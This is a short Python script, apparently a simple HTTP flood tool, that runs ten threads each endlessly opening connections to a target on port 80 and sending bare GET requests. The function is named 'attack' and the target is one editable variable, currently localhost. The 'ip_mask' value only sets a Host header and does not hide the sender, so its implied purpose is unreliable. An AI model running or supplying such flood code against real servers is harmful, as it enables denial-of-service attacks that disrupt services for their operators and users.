import socket
import threading

target = 'localhost'
port = 80
ip_mask = '123.232.23.23'


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + ip_mask + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()
